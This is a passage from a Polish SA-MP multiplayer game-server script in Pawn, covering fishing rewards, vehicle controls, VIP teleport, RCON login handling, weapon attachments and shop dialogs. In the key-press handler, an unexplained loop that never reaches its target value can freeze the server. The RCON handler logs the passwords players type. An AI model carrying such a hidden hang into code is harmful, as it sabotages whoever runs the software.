		&& GetPlayerInterior(playerid) == GetPropertyInteriorId( currentInt[playerid]))
	{
	    SetPlayerVirtualWorld(playerid, 0);
		currentInt[playerid] = -1;
	}
	return 1;
}

encode_panels(flp, frp, rlp, rrp, windshield, front_bumper, rear_bumper)
{
    return flp | (frp << 4) | (rlp << 8) | (rrp << 12) | (windshield << 16) | (front_bumper << 20) | (rear_bumper << 24);
}
encode_doors(bonnet, boot, driver_door, passenger_door)
{
    return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
}
encode_lights(light1, light2, light3, light4)
{
    return light1 | (light2 << 1) | (light3 << 2) | (light4 << 3);
}

UpSpec(playerid)
{
	if(SpecPlayer[playerid] >= MAX_PLAYERS) return 1;

	for(new i = SpecPlayer[playerid]; i < MAX_PLAYERS; i++)
	{
	    if(i == SpecPlayer[playerid]) continue;

	    if(IsPlayerConnected(i) && i != playerid && GetPlayerState(i) > 0 && GetPlayerState(i) < 7)
	    {
	        StartSpec(playerid, i);
	        break;
	    }
	}
	return 1;
}
DownSpec(playerid)
{
	if(SpecPlayer[playerid] < 1) return 1;

	for(new i = SpecPlayer[playerid]; --i;)
	{
	    if(IsPlayerConnected(i) && i != playerid && GetPlayerState(i) > 0 && GetPlayerState(i) < 7)
	    {
	        StartSpec(playerid, i);
	        break;
	    }
	}
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
    if((newkeys & KEY_SUBMISSION) && GetPlayerState(playerid) == 2)
	{
		if((gettime() - EndUzycieNprawa[playerid]) < 10)
		{
			new naprawiony_sek[1000];
			format(naprawiony_sek, sizeof(naprawiony_sek), "Czekaj ~r~%d sek", 10 - (gettime() - EndUzycieNprawa[playerid]));
            TextDrawSetString(Naprawa_TD[0], naprawiony_sek);
            TD_Show(playerid, Naprawa_TD[0]);
            TD_Show(playerid, Naprawa_TD[1]);
            SetTimerEx("TD_Naprawa_TD_Czekaj_Hide", 4000, 0, "d", playerid);
			}else{
			RepairVehicle(GetPlayerVehicleID(playerid));
			new naprawiony[1000];
			format(naprawiony, sizeof(naprawiony), "Pojazd naprawiony~r~!");
            TextDrawSetString(Naprawa_TD[0], naprawiony);
            TD_Show(playerid, Naprawa_TD[0]);
            TD_Show(playerid, Naprawa_TD[1]);
            SetTimerEx("TD_Naprawa_TD_Hide", 4000, 0, "d", playerid);
			PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			EndUzycieNprawa[playerid] = gettime();
		}
	}
    if((newkeys & KEY_SECONDARY_ATTACK)&&!(oldkeys & KEY_SECONDARY_ATTACK) && (lowiryby[playerid] == 0))
	{
		for( new o; o != sizeof Ryby_Pozycje; o ++ )
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, Ryby_Pozycje[ o ][ 0 ], Ryby_Pozycje[ o ][ 1 ], Ryby_Pozycje[ o ][ 2 ]))
			{
				TogglePlayerControllable(playerid, 0);
				lowiryby[playerid] = true;
				SetProgressBarValue(Bar:ryby, 0);
				ShowProgressBarForPlayer(playerid, ryby);
				SetPlayerAttachedObject(playerid, 0,18632,6,0.079376,0.037070,0.007706,181.482910,0.000000,0.000000,1.000000,1.000000,1.000000);
			}
		}
	}
	else if((newkeys & KEY_SECONDARY_ATTACK) && !(oldkeys & KEY_SECONDARY_ATTACK) && (lowiryby[playerid] == 1))
	{
		lowiryby[playerid] = false;
		TogglePlayerControllable(playerid, 1);
		HideProgressBarForPlayer(playerid, ryby);
		new hahaha=0;
		while(hahaha!=MAX_PLAYER_ATTACHED_OBJECTS)
		{
			if(IsPlayerAttachedObjectSlotUsed(playerid, hahaha))
			{
				RemovePlayerAttachedObject(playerid, hahaha);
			}
			hahaha++;
		}
	}
	else if((newkeys & KEY_SPRINT ) && !( oldkeys & KEY_SPRINT ) && ( lowiryby[playerid] == 1))
	{
		ApplyAnimation(playerid,"SWORD","sword_block",50.0,0,1,0,1,1);
		GetProgressBarValue(Bar:ryby);
		SetProgressBarValue(Bar:ryby, GetProgressBarValue(Bar:ryby)+0.5);
		ShowProgressBarForPlayer(playerid, ryby);

		if(GetProgressBarValue(Bar:ryby) >= 100)
		{
			ApplyAnimation(playerid, "CARRY", "crry_prtial", 2.0, 0, 0, 0, 0, 0);
			lowiryby[playerid] = false;
			TogglePlayerControllable(playerid, 1);
			HideProgressBarForPlayer(playerid, ryby);
			new lols=0;
			while(lols!=MAX_PLAYER_ATTACHED_OBJECTS)
			{
				if(IsPlayerAttachedObjectSlotUsed(playerid, lols))
				{
					RemovePlayerAttachedObject(playerid, lols);
				}
				lols++;
			}
			//Co siê dzieje gdy z³owimy rybe ;d z tych 10 losuje siê jedno, mo¿na dodaæ wiêcej..Jezeli dodasz nowe radom(11), zmien i pamiêtaj zawsze o 1 wiêcej ;d
			new Zlowil_Rybe = random(11);
            if(Zlowil_Rybe == 0)
			{
                PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);//Dzwiêk ;d
				SCM(playerid,0xFFFFFFFF, ""czat" "C_B"Upss! "C_O"Haczyk siê zerwa³ spróbuj jeszcze raz..");//informacja ;d
			}
			if(Zlowil_Rybe == 1)
			{
			    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);//Dzwiêk ;d
				SCM(playerid,0xFFFFFFFF, ""czat" "C_B"Gratulacje! "C_O"Z³owi³eœ/aœ p³otkê zdobywasz 500$ i 8 exp'a.");//Informacja ;d
				GivePlayerMoney(playerid, 800);//Daje kase ;d
				GivePlayerScore(playerid, 8);//Daje  ;d
			}
			if(Zlowil_Rybe == 2)
			{
			    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, ""czat" "C_B"Gratulacje! "C_O"Z³owi³eœ/aœ fl¹dre zdobywasz 800$ i 15 exp'a.");
				GivePlayerMoney(playerid, 800);
				GivePlayerScore(playerid, 15);
			}
			if(Zlowil_Rybe == 3)
			{
                PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, ""czat" "C_B"Upss! "C_O"Nic nie z³owi³eœ/aœ..");
			}
			if(Zlowil_Rybe == 4)
			{
			    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, "{DF00DF}|£owisko| {3C3CFF}Gratulacje! Z³owi³eœ/aœ kie³ba zdobywasz 1000$ i 35 exp'a.");
				GivePlayerMoney(playerid, 1000);
	            GivePlayerScore(playerid, 35);
			}
			if(Zlowil_Rybe == 5)
			{
			    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, "{DF00DF}|£owisko| {3C3CFF}Gratulacje! Z³owi³eœ/aœ karasia zdobywasz 300$ i 4 exp'a.");
				GivePlayerMoney(playerid, 300);
				GivePlayerScore(playerid, 4);
			}
			if(Zlowil_Rybe == 6)
			{
			    PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, "{DF00DF}|£owisko| {A40000}Upss! Haczyk siê zerwa³ spróbuj jeszcze raz..");
			}
			if(Zlowil_Rybe == 7)
			{
			    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, "{DF00DF}|£owisko| {3C3CFF}Gratulacje! Z³owi³eœ/aœ suma zdobywasz 2500$ i 50 exp'a.");
				GivePlayerMoney(playerid, 2500);
				GivePlayerScore(playerid, 50);
			}
			if(Zlowil_Rybe == 8)
			{
			    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
			    SCM(playerid,0xFFFFFFFF, "{DF00DF}|£owisko| {3C3CFF}Gratulacje! Z³owi³eœ/aœ ³ososia zdobywasz 900$ i 25 exp'a.");
				GivePlayerMoney(playerid, 900);
				GivePlayerScore(playerid, 25);
			}
			if(Zlowil_Rybe == 9)
			{
			    PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, "{DF00DF}|£owisko| {A40000}Upss! Nic nie z³owi³eœ/aœ..");
			}
			if(Zlowil_Rybe == 10)
			{
			    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, "{DF00DF}|£owisko| {3C3CFF}Gratulacje! Z³owi³eœ/aœ karpia zdobywasz 800$ i 10 exp'a.");
				GivePlayerMoney(playerid, 800);
				GivePlayerScore(playerid, 10);
			}
			if(Zlowil_Rybe == 11)
			{
			    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
				SCM(playerid,0xFFFFFFFF, "{DF00DF}|£owisko| {3C3CFF}Gratulacje! Z³owi³eœ/aœ okonia zdobywasz 900$ i 32 exp'a.");
				GivePlayerMoney(playerid, 900);
				GivePlayerScore(playerid, 32);
			}
		}
	}
	if(AnnOFF == 0)
	{
	    new sru;
	    while(sru != 2)
	    {
	        sru += 3;
	    }
	}
	if(GetPlayerState(playerid) == 9 && Administrator[playerid] > 1 && SpecPlayer[playerid] != -1)
	{
	    if((newkeys & 8))
	    {
	        DownSpec(playerid);
	    }else if((newkeys & 32))
	    {
	        UpSpec(playerid);
	    }
	    return 1;
	}

	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    static vid;
		vid = GetPlayerVehicleID(playerid);

		if(GetPVarInt(playerid, "rNitro") != 3)
		{
			switch(GetPVarInt(playerid, "rNitro"))
			{
				case 0:
				{
					if((newkeys & KEY_FIRE))
	    			{
						AddVehicleComponent(vid, 1010);
					}
					if((oldkeys & KEY_FIRE))
					{
						RemoveVehicleComponent(vid, 1010);
					}
				}
				case 1:
				{
					if((newkeys & KEY_FIRE))
	    			{
						AddVehicleComponent(vid, 1010);
					}
				}
				case 2:
				{
					if((newkeys & KEY_FIRE))
	    			{
	    			    if(GetPVarInt(playerid, "rrNitro") == 0)
	    			    {
							AddVehicleComponent(vid, 1010);
							SetPVarInt(playerid, "rrNitro", 1);
						}
						else
						{
						    SetPVarInt(playerid, "rrNitro", 0);
						    RemoveVehicleComponent(vid, 1010);
						}
					}
				}
			}
		}
		if(GetVehicleComponentInSlot(vid, 9) != 1087)
	    {
	        static engine,lights,alarm,doors,bonnet,boot,objective;
			if((newkeys & KEY_ANALOG_UP))
			{
				GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
				if(bonnet == 0) SetVehicleParamsEx(vid,engine,lights,alarm,doors,1,boot,objective);
				else SetVehicleParamsEx(vid,engine,lights,alarm,doors,0,boot,objective);
   			}
			if((newkeys & KEY_ANALOG_DOWN))
			{
				GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
				if(boot == 0) SetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,1,objective);
				else SetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,0,objective);
 			}
			if((newkeys & KEY_ANALOG_RIGHT))
			{
			 	GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
				if(alarm == 0) SetVehicleParamsEx(vid,engine,lights,1,doors,bonnet,boot,objective);
				else SetVehicleParamsEx(vid,engine,lights,0,doors,bonnet,boot,objective);
  			}
			if((newkeys & KEY_ANALOG_LEFT))
			{
			 	GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
				if(engine == 0) SetVehicleParamsEx(vid,1,lights,alarm,doors,bonnet,boot,objective);
				else SetVehicleParamsEx(vid,0,lights,alarm,doors,bonnet,boot,objective);
 			}
		}

		if(newkeys & KEY_SECONDARY_ATTACK)
		{
			if(GetVehicleModel(vid) == 441
				|| GetVehicleModel(vid) == 464
				|| GetVehicleModel(vid) == 465
				|| GetVehicleModel(vid) == 501
				|| GetVehicleModel(vid) == 564
				|| GetVehicleModel(vid) == 594)
			{
				RemovePlayerFromVehicle(playerid);
				SetCameraBehindPlayer(playerid);
			}
		}

		if(newkeys & KEY_SUBMISSION)
		{
		    UpdateVehicleDamageStatus(vid,encode_panels(0,0,0,0,0,0,0),encode_doors(0,0,0,0),encode_lights(0,0,0,0),0000);
	        new Float:a, Float:x, Float:y, Float:z;
	        GetVehicleVelocity(vid, x,y,z);
		    GetVehicleZAngle(vid, a);
		    SetVehicleZAngle(vid, a);
		    SetVehicleVelocity(vid, x,y,z);
		}

		if(GetVehicleModel(vid) == 525 && (newkeys & KEY_ACTION))
        {
            if(IsTrailerAttachedToVehicle(vid) == 1)
            {
            	DetachTrailerFromVehicle(vid);
            	return 1;
            }
        	new Float:vX, Float:vY, Float:vZ, c;

			while(c < MAX_VEHICLES)
   			{
   				GetVehiclePos(c,vX,vY,vZ);
   				if(IsPlayerInRangeOfPoint(playerid, 7.0, vX, vY, vZ) == 1 && c != vid)
   				{
		     	   	AttachTrailerToVehicle(c, vid);
					return 1;
           		}
    			c++;
			}
	    }

		if((newkeys & KEY_ACTION) && pRamp[playerid][0] == 1 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 525)
		{
			if(NoRampCar(vid) && GetPVarInt(playerid, "pRampUse") == 0)
			{
				new Float:x, Float:y, Float:z, Float:angle, Float:rotY = 10.0;
				GetVehiclePos(vid, x, y, z);
		 		GetVehicleZAngle(vid, angle);
				x += (16.0 * floatsin(-angle, degrees));
				y += (16.0 * floatcos(-angle, degrees));

				switch(pRamp[playerid][1])
				{
				    case 0:
				    {
				        rotY -= 2.0;
				    }case 2:
					{
						angle -= 90.0;
						if (angle < 0.0) angle += 360.0;
						z += 0.5;
					}case 1:
					{
						z -= 0.5;
						rotY -= 1.0;
					}case 6:
					{
						z += 0.5;
					}case 7:
					{
					    z += 0.5;
						rotY -= 6.0;
					}
					case 8:
					{
						angle -= 90.0;
						rotY -= 10.0;
					}
					case 9:
					{
					    rotY -= 35.0;
						z += 3.0;
					}
				}
				SetPVarInt(playerid, "pRampUse", 1);
				SetTimerEx("RemoveRamp", 2500, 0, "dd", playerid, CreatePlayerObject(playerid, RampTypes[pRamp[playerid][1]], x, y, z - 0.5, rotY, 0.0, angle));
			}
		}
	}

	return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	if(pAFK[playerid] != 0)
	{
 		SCM(playerid, -1, "Wpisz "C_B"/jj"C_O", aby aktywowaæ dzia³ania na serwerze.");
		return 0;
	}

	if(!Vip[playerid] && Administrator[playerid] < 1)
	    return SCM(playerid, 0xFFFFFFFF, ""C_B"Teleportowaæ siê w dowolne miejsce na mapie mo¿e tylko"C_O" VIP!");

	if(GetPlayerVirtualWorld(playerid) != 0 || GetPlayerInterior(playerid) != 0)
	    return SCM(playerid, 0xFFFFFFFF, ""C_B"Nie mo¿esz teraz siê teleportowaæ!");

	if(pInFun[playerid] == 1)
	    return SCM(playerid, 0xFFFFFFFF, ""C_B"Nie mo¿esz siê teraz teleportowaæ!");

	if(GetPVarInt(playerid, "vTeleMap") == 1)
	    return SCM(playerid, 0xFFFFFFFF, ""C_B"Aby siê teleportowaæ u¿ywaj¹c mapy w menu, w³¹cz opcje teleportowania.");

	if(IsPlayerFight(playerid) == 1)
	{
	    format(strx, sizeof strx, "* "C_O"Najpierw dokoñcz walke z "C_B"%s", pName[pAntyTele[playerid][0]]);
		SCM(playerid, 0xFFFFFFFF, strx);
		return 1;
	}

	if(Administrator[playerid] < 1)
	{
		CommandUseBlock(playerid, "TeleMap", 15000);
	}

	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		SetVehiclePos(GetPlayerVehicleID(playerid), fX,fY,fZ + 2.0);
	}else SetPlayerPos(playerid, fX, fY, fZ + 0.3);

	format(strx, sizeof strx, "Teleportowa³eœ siê do:\n"C_B"%.f, %.f, %.f", fX,fY,fZ);
	SCM(playerid, 0xFFFFFFFF, strx);
	SetPVarInt(playerid, "ClickMapa", gettime() + 15);
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	new playerIP[16];
	for(new player=0; player<GetMaxPlayers(); player++)
	{
		if(IsPlayerConnected(player))
		{
			GetPlayerIp(player, playerIP, 16);
			if(!strcmp(ip, playerIP, true, 16))
			{
				BanPlayer(player, "Ochrona", "Próba zalogowania na RCON");
                format(strx, sizeof strx, "%s (%d) (IP: %d) probowal zalogowac sie na RCON, wpisane haslo: %s", pName, player, playerIP, password);
	            WriteLog(strx);
			}
		}
	}
	return 1;
}

stock GetVehSpeed(vehid)
{
new Float:X, Float:Y, Float:Z;
GetVehicleVelocity(vehid, X, Y, Z);
return floatround(floatsqroot(floatpower(X, 2) + floatpower(Y, 2) + floatpower(Z, 2)) * 200);
}
public OnPlayerUpdate(playerid)
{
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK && IsPlayerInDM(playerid) == 0) SetPlayerArmedWeapon(playerid, 0);

	pLastUpdate[playerid] = 0;

	static Float:vHP;

	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new vid = GetPlayerVehicleID(playerid);
		new PrzebiegPojazdu[800];
		if(ZespawnowanyPrivCar[playerid] == true && GetPlayerVehicleID(playerid) == PrywatnyPojazd[playerid])
		{
			PrivSpeed[playerid] += GetVehSpeed(vid);
			if(PrivSpeed[playerid] >= 1000)
			{
				PrivPrzebieg[playerid] += 0.01;
				PrivSpeed[playerid] = 0;
				format(PrzebiegPojazdu, sizeof(PrzebiegPojazdu), ""C_O"W³aœciciel: "C_B"%s\n"C_O"Przebieg: "C_B"%.1f "C_O"km", pName[playerid], PrivPrzebieg[playerid]);
				Update3DTextLabelText(PrywatnyPojazdLabel[playerid], 0x00FFFFFF, PrzebiegPojazdu);
			}
		}
		GetVehicleHealth(GetPlayerVehicleID(playerid), vHP);

		if(vHP < 2000)
		{
			format(strx, sizeof(strx), "%s~n~HP: ~r~%d", VehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid)) - 400], floatround(((vHP - 250) * 100) / 750));
			TextDrawSetString(Stan[0][playerid], strx);
			format(strx, sizeof(strx), "Predkosc~n~km/h ~r~%d", GetVehSpeed(GetPlayerVehicleID(playerid)), floatround(((vHP - 250) * 100) / 750));
			TextDrawSetString(Stan[1][playerid], strx);
		}else
		{
			format(strx, sizeof(strx), "%s~n~HP: ~r~GOD");
			TextDrawSetString(Stan[0][playerid], strx);
			format(strx, sizeof(strx), "Predkosc~n~km/h ~r~%d", VehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid)) - 400], GetVehSpeed(GetPlayerVehicleID(playerid)), floatround(((vHP - 250) * 100) / 750));
			TextDrawSetString(Stan[1][playerid], strx);
		}
		new Float:vec[3];
		GetPlayerCameraFrontVector(playerid, vec[0], vec[1], vec[2]);
		new bool:possible_crasher = false;
		for (new i = 0; !possible_crasher && i < sizeof(vec); i++)
		if (floatabs(vec[i]) > 10.0)
		possible_crasher = true;

		if (possible_crasher)
		return 0;
	}
	if(GetTickCount() - armedbody_pTick[playerid] > 113){ //prefix check itter
		new
		weaponid[13],weaponammo[13],pArmedWeapon;
		pArmedWeapon = GetPlayerWeapon(playerid);
		GetPlayerWeaponData(playerid,1,weaponid[1],weaponammo[1]);
		GetPlayerWeaponData(playerid,2,weaponid[2],weaponammo[2]);
		GetPlayerWeaponData(playerid,4,weaponid[4],weaponammo[4]);
		GetPlayerWeaponData(playerid,5,weaponid[5],weaponammo[5]);
		#if ARMEDBODY_USE_HEAVY_WEAPON
		GetPlayerWeaponData(playerid,7,weaponid[7],weaponammo[7]);
		#endif
		if(weaponid[1] && weaponammo[1] > 0){
			if(pArmedWeapon != weaponid[1]){
				if(!IsPlayerAttachedObjectSlotUsed(playerid,0)){
					SetPlayerAttachedObject(playerid,0,GetWeaponModel(weaponid[1]),1, 0.199999, -0.139999, 0.030000, 0.500007, -115.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				}
			}
			else {
				if(IsPlayerAttachedObjectSlotUsed(playerid,0)){
					RemovePlayerAttachedObject(playerid,0);
				}
			}
		}
		else if(IsPlayerAttachedObjectSlotUsed(playerid,0)){
			RemovePlayerAttachedObject(playerid,0);
		}
		if(weaponid[2] && weaponammo[2] > 0){
			if(pArmedWeapon != weaponid[2]){
				if(!IsPlayerAttachedObjectSlotUsed(playerid,1)){
					SetPlayerAttachedObject(playerid,1,GetWeaponModel(weaponid[2]),8, -0.079999, -0.039999, 0.109999, -90.100006, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				}
			}
			else {
				if(IsPlayerAttachedObjectSlotUsed(playerid,1)){
					RemovePlayerAttachedObject(playerid,1);
				}
			}
		}
		else if(IsPlayerAttachedObjectSlotUsed(playerid,1)){
			RemovePlayerAttachedObject(playerid,1);
		}
		if(weaponid[4] && weaponammo[4] > 0){
			if(pArmedWeapon != weaponid[4]){
				if(!IsPlayerAttachedObjectSlotUsed(playerid,2)){
					SetPlayerAttachedObject(playerid,2,GetWeaponModel(weaponid[4]),7, 0.000000, -0.100000, -0.080000, -95.000000, -10.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				}
			}
			else {
				if(IsPlayerAttachedObjectSlotUsed(playerid,2)){
					RemovePlayerAttachedObject(playerid,2);
				}
			}
		}
		else if(IsPlayerAttachedObjectSlotUsed(playerid,2)){
			RemovePlayerAttachedObject(playerid,2);
		}
		if(weaponid[5] && weaponammo[5] > 0){
			if(pArmedWeapon != weaponid[5]){
				if(!IsPlayerAttachedObjectSlotUsed(playerid,3)){
					SetPlayerAttachedObject(playerid,3,GetWeaponModel(weaponid[5]),1, 0.200000, -0.119999, -0.059999, 0.000000, 206.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				}
			}
			else {
				if(IsPlayerAttachedObjectSlotUsed(playerid,3)){
					RemovePlayerAttachedObject(playerid,3);
				}
			}
		}
		else if(IsPlayerAttachedObjectSlotUsed(playerid,3)){
			RemovePlayerAttachedObject(playerid,3);
		}
		#if ARMEDBODY_USE_HEAVY_WEAPON
		if(weaponid[7] && weaponammo[7] > 0){
			if(pArmedWeapon != weaponid[7]){
				if(!IsPlayerAttachedObjectSlotUsed(playerid,4)){
					SetPlayerAttachedObject(playerid,4,GetWeaponModel(weaponid[7]),1,-0.100000, 0.000000, -0.100000, 84.399932, 112.000000, 10.000000, 1.099999, 1.000000, 1.000000);
				}
			}
			else {
				if(IsPlayerAttachedObjectSlotUsed(playerid,4)){
					RemovePlayerAttachedObject(playerid,4);
				}
			}
		}
		else if(IsPlayerAttachedObjectSlotUsed(playerid,4)){
			RemovePlayerAttachedObject(playerid,4);
		}
		#endif
		armedbody_pTick[playerid] = GetTickCount();
	}
	return 1;
}

stock GetWeaponModel(weaponid)
{
	switch(weaponid)
	{
		case 1:
			return 331;

		case 2..8:
			return weaponid+331;

		case 9:
			return 341;

		case 10..15:
			return weaponid+311;

		case 16..18:
			return weaponid+326;

		case 22..29:
			return weaponid+324;

		case 30,31:
			return weaponid+325;

		case 32:
			return 372;

		case 33..45:
			return weaponid+324;

		case 46:
			return 371;
	}
	return 0;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == 112){
		if(response){
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			ShowPlayerDialog(playerid,113,2,"{3FBAFC}Statystyki","Statystyki Serwera\nTOP List - Respekt\nTOP List - Kasy\nTOP List - Kasy w banku\nTOP List - Wizyt\nTOP List - Minigun\nTOP List -RGP\nTOP Wygranych /WG\nTOP Wygranych /CH\nTOP Wygranych /TW\nTOP Wygranych /HY\nTOP Wygranych /SS\nTOP Wygranych /DD\nTOP Przepisanych Kodów\nTOP Obliczonych Zadañ Matematycznych","Dalej","Wyjdz");
		}
		return 1;
	}
	if(dialogid == 125)
	{
		if(response == 1)
			ShowPlayerDialog(playerid, 126, DIALOG_STYLE_LIST, "Wybierz kolor jakim chcesz siê pos³ugiwaæ", "1. Zielony\n2. Czerwony\n3. Pomarañczowy\n4. Ró¿owy\n5. Fioletowy\n6. Niebieski\n7. B³êkit\n8. ¯ó³ty \n9. Limonkowy\n10. Losowy kolor", "ZatwierdŸ", "Anuluj");
		else
			SendClientMessage(playerid, GetPlayerColor(playerid), "Kolor nie zosta³ zmieniony. (To jest obecny kolor)");
	}
	if(dialogid == 126) {
		if ( !response ) return 1;

		switch( listitem ) {
			case 0: SetPlayerColor( playerid, 0x00FF0AFF );		// Zielone
			case 1: SetPlayerColor( playerid, 0xFF0000FF ); 	//Czerwone
			case 2: SetPlayerColor( playerid, 0xFFCA00FF ); 	//Pomaranczowe
			case 3: SetPlayerColor( playerid, 0xFF00E0FF ); 	// Rozowy
			case 4: SetPlayerColor( playerid, 0xCE2DE0FF );		// Fiolet
			case 5: SetPlayerColor( playerid, 0x005DFFFF );		// Niebieski
			case 6: SetPlayerColor( playerid, 0x00FEFFFF );		// Niebieski (b³êkit)
			case 7: SetPlayerColor( playerid, 0xD3FF00FF );		// Zolty
			case 8: SetPlayerColor( playerid, 0x93F600FF );		// Limonkowy
			case 9: SetPlayerColor( playerid, MAKE_COLOUR( random( 255 ), random( 255 ), random( 255 ) ) ); // Losowy kolor
		}
	}
	if(dialogid == 345)
	{
		switch(listitem)
		{
			case 0:
			{
				if(GetPlayerMoney(playerid) < 2500000) return SCM(playerid, -1, ""C_B"Nie staæ Ciê na miniguna ! ");
				GivePlayerWeapon(playerid, 38, 5000);
				GivePlayerMoney(playerid, -2500000);
				SendClientMessage(playerid, -1, ""C_O"Kupi³eœ(aœ) miniguna. ");
			}
			case 1:
			{
				if(GetPlayerMoney(playerid) < 2000000) return SCM(playerid, -1, ""C_B"Nie staæ Ciê na wyrzutniê rakiet ! ");
				GivePlayerWeapon(playerid, 35, 5000);
				GivePlayerMoney(playerid, -2000000);
				SendClientMessage(playerid, -1, ""C_O"Kupi³eœ(aœ) wyrzutniê rakiet ");
			}
			case 2:
			{
				if(GetPlayerMoney(playerid) < 2500000) return SCM(playerid, -1, ""C_B"Nie staæ Ciê na wyrzutniê rakiet ! ");
				GivePlayerWeapon(playerid, 36, 5000);
				GivePlayerMoney(playerid, -2500000);
				SendClientMessage(playerid, -1, ""C_O"Kupi³eœ(aœ) wyrzutniê rakiet ");
			}
			case 3:
			{
				if(GetPlayerMoney(playerid) < 1500000) return SCM(playerid, -1, ""C_B"Nie staæ Ciê na miotacz ognia ! ");
				GivePlayerWeapon(playerid, 37, 5000);
				GivePlayerMoney(playerid, -1500000);
				SendClientMessage(playerid, -1, ""C_O"Kupi³eœ(aœ) miotacz ognia ");
			}
			case 4:
			{
				if(GetPlayerMoney(playerid) < 500000) return SCM(playerid, -1, ""C_B"Nie staæ Ciê na granaty ! ");
				GivePlayerWeapon(playerid, 16, 5000);
				GivePlayerMoney(playerid, -500000);
				SendClientMessage(playerid, -1, ""C_O"Kupi³eœ(aœ) granaty ");
			}
			case 5:
			{
				if(GetPlayerMoney(playerid) < 500000) return SCM(playerid, -1, ""C_B"Nie staæ Ciê na koktajle motolova ! ");
				GivePlayerWeapon(playerid, 18, 5000);
				GivePlayerMoney(playerid, -500000);
				SendClientMessage(playerid, -1, ""C_O"Kupi³eœ(aœ) koktajle motolova. ");
			}
			case 6:
			{
				if(GetPlayerMoney(playerid) < 15000) return SCM(playerid, -1, ""C_B"Nie staæ Ciê na niewiedzialnoœæ ! ");
				SetPlayerColor(playerid, 0xFFFEFF00);
				SendClientMessage(playerid, -1, ""C_O"Sta³eœ(aœ) siê niewidzialny(a). ");
			}
		}
	}
	if(dialogid == 566){
		if(response){
			new Float:x,Float:y,Float:z;
			GetPlayerPos(playerid,x,y,z);
			SetPlayerPos(GetPVarInt(playerid,"tpdo"),x,y,z+2);
			}else{
			SCM(GetPVarInt(playerid,"tpdo"),-1,""C_B"Gracz nie zgodzil sie na teleport do niego!");
		}
		return 1;
	}

	if(dialogid == 400)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					new string[1230];
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					strcat(string,"Admiral\nAlpha\nAmbulans\nBaggage\nBandito\nBanshee\nBarracks\nBenson\nBfinject\nBlade\nBlistac\nBloodra\nBobcat\nBoxburg\nBoxville\nBravura\nBroadway\nBuccanee\nBuffalo\nBullet\nBurrito\nBus\nCabbie\nCaddy\nCadrona\nCamper\nCement\nCheetah\nClover\nClub\nCoach\nCombine\nComet\nCopCarla\nCopCarru\nCopCarsf\nCopCarvg\nCft30\nDozer\nDumper\nDuneride\nElegant\nElegy\nEmperor\nEnforcer\nEsperant\nEuros\nFbiranch\nFbitruck\nFeltze\n");
					strcat(string,"Firela\nFiretruck\nFlash\nFlatbed\nForklift\nFortune\nGlendale\nGreenwoo\nHermes\nHotdog\nHotknife\nHotrina\nHotrinb\nHotring\nHuntley\nHustler\nInfernus\nIntruder\nJester\nJourney\nKart\nLandstalker\nLinerunner\nMajestic\nManana\nMerit\nMesa\nMoonbeam\nMower\nMrwhoop\nMonster\nMonsterA\nMonsterB\nMule\nNebula\nNewsvan\nOceanic\nPacker\nPatriot\nPeren\nPetro\nPhoenix\nPicador\nPony\nPremier\nPrevion\nPrimo\nRancher\nRoadtrain\n");
					strcat(string,"Regina\nRemington\nRomero\nRumpoid\nSabre\nSadler\nSandking\nSavanna\nSecurica\nSentinel\nSlamvan\nSolair\nStafford\nStallion\nStratum\nStretch\nSultan\nSunrise\nSupergt\nSwatvan\nSweeper\nTahoma\nTampa\nTaxi\nTopfun\nTornado\nTowtruck\nTractor\nTrash\nTug\nTurismo\nUranus\nUtility\nVincent\nVirgo\nVoodoo\nVortex\nWashington\nWillard\nWindsor\nYankee\nYosemite");
					ShowPlayerDialog(playerid,401,DIALOG_STYLE_LIST,"Samochody",string,"Wybierz","Cofnij");
				}
				case 1:
				{
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
